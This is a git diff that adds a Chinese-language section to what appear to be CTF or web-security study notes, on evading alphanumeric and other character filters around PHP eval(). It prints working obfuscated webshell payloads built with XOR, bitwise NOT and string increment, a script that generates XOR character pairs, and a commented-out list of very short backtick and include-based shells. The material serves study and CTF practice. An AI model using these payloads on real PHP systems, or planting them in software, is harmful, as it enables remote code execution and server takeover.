@@ -398,4 +398,209 @@ open_basedir=.:/proc/:/tmp/
 
 ## `open_basedir`绕过
 
+## 无字母数字
+
+```php
+<?php
+if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
+  eval($_GET['shell']);
+}
+```
+
+将非字母、数字的字符经过各种变换，构造出字母、数字，进而得到函数名，结合 PHP 动态函数的特点，达到执行代码的目的。
+
+PHP 7 引入了抽象语法树（AST），与 PHP 5 在[关于间接使用变量、属性和方法的变化](https://www.php.net/manual/zh/migration70.incompatible.php)。特别说明的是，PHP 7 支持`'phpinfo'()`、`('phpinfo')()`。
+
+$_GET[_] 8 个字符
+
+- 按位异或 XOR`^`
+
+[PHP位运算符](https://www.php.net/manual/zh/language.operators.bitwise.php)中的`按位异或`，如`$a ^ $b`，当两个操作对象**都是字符串**时，将对会组成字符串的字符 ASCII 值执行操作，结果也是一个字符串。按位异或的规则是`相同为0，不同为1`。
+
+```php
+<?php
+echo 0^0; // 0
+echo 0^1; // 1
+echo 1^1; // 0
+echo 1^0; // 1
+
+echo urlencode('a'^'a'); // %00
+echo urlencode('a'^'b'); // %03
+```
+
+我们可以通过
+
+```php
+<?php
+$myfile = fopen("xor_rce.txt", "w");
+$contents = "";
+for ($i = 0; $i < 256; $i++) {
+ for ($j = 0; $j < 256; $j++) {
+
+  if ($i < 16) {
+   $hex_i = '0'.dechex($i);
+  } else {
+   $hex_i = dechex($i);
+  }
+  if ($j < 16) {
+   $hex_j = '0'.dechex($j);
+  } else {
+   $hex_j = dechex($j);
+  }
+  $preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可
+  if (preg_match($preg, hex2bin($hex_i)) || preg_match($preg, hex2bin($hex_j))) {
+   echo "";
+  } else {
+   $a = '%'.$hex_i;
+   $b = '%'.$hex_j;
+   $c = (urldecode($a)^urldecode($b));
+   if (ord($c) >= 32&ord($c) <= 126) {
+    $contents = $contents.$c." ".$a." ".$b."\n";
+   }
+  }
+ }
+}
+fwrite($myfile, $contents);
+fclose($myfile);
+```
+
+简易 payload 如下：
+
+```php
+$_="`{{{"^"?<>/"; // $_ = '_GET';
+${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);
+
+$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
+```
+
+- 按位取反 Not`~`
+
+[PHP位运算符](https://www.php.net/manual/zh/language.operators.bitwise.php)中的`按位取反`，如`~ $a`，将$a 中为 0 的位设为 1，反之亦然。如果操作对象是字符串，则将对组成字符串的字符 ASCII 值进行取反操作，结果将会是字符串。
+
+通过调用代码执行函数，如`assert`，获得`webshell`，代码如下：
+
+```php
+<?php
+/*
+ * echo urlencode(~'assert'); // %9E%8C%8C%9A%8D%8B
+ * echo urlencode(~'_POST');  // %A0%AF%B0%AC%AB
+ */
+
+// assert($_POST[_]);
+// 支持PHP5和PHP7
+$_=~'%9E%8C%8C%9A%8D%8B';$__=~'%A0%AF%B0%AC%AB';$__=$$__;$_($__[_]);
+
+// $_=~'%A0%AF%B0%AC%AB';$_=$$_;(~'%9E%8C%8C%9A%8D%8B')($_[_]);
+```
+
+- 自增
+
+PHP 支持[PERL字符串递增功能](https://www.php.net/manual/zh/language.operators.increment.php)，该字符串必须是字母数字 ASCII 字符串。当到达字母 Z 且递增到下个字母时，将进位到左侧值。例如，$a = 'Z'; $a++;将 $a 变为 'AA'。
+
+!> 自 PHP 8.3.0 起，此功能已软弃用。应该使用 str_increment() 函数。
+
+```php
+// ASSERT($_POST[_]);
+// 由于payload中存在加号+，使用时需要进行URL编码
+$_=[].'';$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
+```
+
+- 过滤`$`
+
+过滤掉`$`，将无法构造变量。
+
+在 PHP7 下，可以利用`('phpinfo')()`语法，生成执行单个命令的 payload。
+
+```php
+<?php
+$func = 'system';
+$cmd = 'whoami';
+
+// system('whoami');
+// PHP 7!
+echo '(~' . urlencode(~$func) . ')(~' . urlencode(~$cmd) . ');'; // (~%8C%86%8C%8B%9A%92)(~%88%97%90%9E%92%96);
+```
+
+```php
+?><?=`. /???/????????[@-[]`;?>
+```
+
+- 过滤`_`
+- 过滤`;`
+
+<https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html>
+
+### 无参数
+
+```php
+<?php
+highlight_file(__FILE__);
+// (?R) 递归语法
+if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
+    eval($_GET['code']);
+}
+?>
+```
+
+`';' === preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $code)`
+
+正则表达式`[^\W]+\((?R)\)`匹配无参数的函数，如`a()`、`a(b())`等。
+
+- <https://xz.aliyun.com/t/10780>
+
 ## 参考资料
+
+<!--
+```
+<?=`$_GET[1]`;
+<? `$_GET[1]`;
+
+<?php
+highlight(__FILE__);
+
+$code = $_GET['code'];
+if(strlen($code)<=1) {
+ eval("?>".$code)
+}
+```
+
+从代码执行到命令执行
+<https://r0yanx.com/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/>
+
+代码执行`eval()`参数限制在 16 个字符
+
+```php
+<?php
+$param = $_REQUEST['param'];
+if((strlen($param) < 17)) {
+ eval($param);
+}
+eval('`$_GET[_]`;');
+eval('exec($_GET[_]);');
+
+eval('?><?=`$_GET[_]`;');
+include$_GET[1];
+include$_GET[1];&1=php://filter/read/convert.base64-decode/resource=N
+
+usort(...$_GET);
+1[]=test&1[]=phpinfo();&2=assert
+```
+
+<https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html>
+最短的传参`$_GET[_]`，长度 8 位；9
+
+<?=`$_GET[_]` 13位
+
+```php
+?><?=`$_GET[_]`； 16位
+
+echo `$_GET[_]`； 16 位
+exec($_GET[_]); //15 无回显
+eval($_GET[_]); // 15
+5+10=15
+exec 10
+system()
+
+```
+
+-->
